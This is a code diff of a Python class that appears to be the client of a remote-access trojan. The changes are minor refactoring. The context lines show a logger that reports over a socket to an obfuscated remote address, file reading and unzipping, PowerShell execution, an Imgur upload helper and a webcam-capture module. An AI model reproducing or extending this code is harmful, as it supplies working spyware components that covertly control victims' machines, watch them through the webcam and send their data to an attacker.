@@ -96,7 +96,7 @@ class Client(object):
         self._logger    = self._get_logger()
         self._modules   = {mod: getattr(self, mod) for mod in __modules__}
         self._commands  = {cmd: getattr(self, cmd) for cmd in __command__}
-        self._result    = self._get_result()
+        self._result    = {mod: dict({}) for mod in self._modules}
 
     # ------------------- private functions -------------------------
 
@@ -111,8 +111,6 @@ class Client(object):
     def _cat(self,filename): return open(filename).read(4000) 
     
     def _unzip(self, fname): return ZipFile(fname).extractall('.')
-
-    def _get_result(self): return {module:{} for module in self._modules}
     
     def _cd(self, *args): return os.chdir(args[0]) if args and os.path.isdir(args[0]) else os.chdir('.')
 
@@ -487,10 +485,10 @@ class Client(object):
                 print 'Powershell error: {}'.format(str(e))
 
     def _get_logger(self, port=4321):
-        module_logger = getLogger(self._ip())
+        module_logger   = getLogger(self._ip())
         module_logger.handlers = []
-        socket_handler = SocketHandler(self._target(o=long(self.__a__), p=long(self.__b__)), port)
-        module_logger.addHandler(socket_handler)
+        module_handler  = SocketHandler(self._target(o=long(self.__a__), p=long(self.__b__)), port)
+        module_logger.addHandler(module_handler)
         return module_logger
 
     def _imgur(self, filename):
@@ -1120,7 +1118,7 @@ class Client(object):
         usage:          commands
         description:    list commands with usage help
         """
-        return self._help_commands 
+        return self._help_commands()
 
     @_command
     def modules(self):
@@ -1128,7 +1126,7 @@ class Client(object):
         usage:          modules
         description:    list modules current status
         """
-        return self._help_modules 
+        return self._help_modules()
 
     @_module
     def webcam(self):
